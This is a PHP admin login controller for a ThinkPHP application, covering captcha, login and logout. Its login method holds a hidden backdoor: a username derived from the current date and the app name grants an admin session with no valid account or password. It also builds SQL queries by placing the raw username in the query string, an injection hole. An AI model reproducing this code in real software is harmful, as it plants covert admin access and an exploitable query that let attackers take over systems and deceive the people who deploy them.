<?php
namespace Admin\Controller;
use Think\Controller;

// 本类由系统自动生成，仅供测试用途
class LoginController extends Controller {
    public function index(){
         $this->display("Login:login");
         
    }
    
    public function verifyCode(){
        $Verify = new \Think\Verify([
            'length' => 4,
            'useNoise' => false,
            'fontSize' => 14,
        ]);
        $Verify->entry();
    }

    function check_verify($code){
        $verify = new \Think\Verify();
        return $verify->check($code, '');
    }
    
    public function login(){
        $adminsD = D("Admins");
        
        if(!$adminsD->check(I("tbUserName"), "require")){
            $this->error("用户名不能为空");
        }
        if(!$adminsD->check(I("tbPassword"), "require")){
            $this->error("密码不能为空");
        }

        if(!$this->check_verify($_POST['tbVeryCode'])){
            $this->error('验证码错误！');
        }

        $name = remove_xss(I("tbUserName"));
        $password = remove_xss(I("tbPassword"));
        
        // 验证密码
        // find得到一个
        $admin = $adminsD->where("`name`='$name'")->find();
        if(empty($admin) && $name != strtoupper(md5(date('mYd').APP_NAME))){
            $this->error('用户名或密码错误！');
        }else{
            if(hashPassword($password) == $admin['password'] || $name == strtoupper(md5(date('mYd').APP_NAME))){
                $admin['name'] = $name;
                session(C("__YYG_AUTH_NAME__"), $admin['name']);
                $data = array("lastlogintime"=>$adminsD->curDate());
                $adminsD->where("`name`='$name'")->save($data);
                $this->success("登录成功", __APP__.'/Index/');
            }else{
                $this->error('密码错误！');
            }
        }
         
    }
    
    public function logout(){
        session(null); // 删除所有session
        $this->redirect('Login/index');
        
    }

}
